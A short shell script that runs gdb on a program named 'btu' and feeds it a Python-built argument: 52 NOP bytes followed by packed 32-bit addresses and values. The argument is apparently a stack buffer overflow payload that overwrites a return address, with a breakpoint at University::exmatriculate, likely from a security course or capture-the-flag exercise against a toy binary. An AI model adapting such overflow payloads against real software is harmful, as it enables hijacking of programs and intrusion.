#!/bin/sh

gdb ./build/bin/btu \
    -ex "set args remove 1782914303  $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*52 +  b"\xbb\xb0\x04\x08"+ b"\xde\xad\xbe\xef" + b"\xe0\x0d\x05\x08" + b"\xff\x1c\x45\x6a")')" \
    -ex "break University::exmatriculate" \
    -ex "run"